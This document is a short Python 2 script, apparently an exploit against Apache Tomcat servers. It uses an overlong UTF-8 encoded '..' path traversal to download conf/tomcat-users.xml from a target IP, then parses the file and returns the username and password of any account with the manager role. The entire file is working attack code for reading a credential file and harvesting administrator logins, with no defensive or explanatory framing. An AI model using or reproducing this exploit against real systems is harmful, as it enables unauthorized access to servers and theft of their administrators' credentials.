import urllib2 as web
import xml.etree.ElementTree as ElementTree

DOT_DOT = "%c0%ae%c0%ae"

def get_tomcatusersxml(ip):
    response = web.urlopen("http://"+ip+"/"+DOT_DOT+"/"+DOT_DOT+"/conf/tomcat-users.xml").read()

    return ElementTree.fromstring(response)

def find_manager(tree):
    users = tree.iterfind("user[@roles]")

    for user in users:
        roles = user.attrib["roles"].split(",")
        for role in roles:
            if role == "manager":
                return (user.attrib["username"], user.attrib["password"])

    raise KeyError
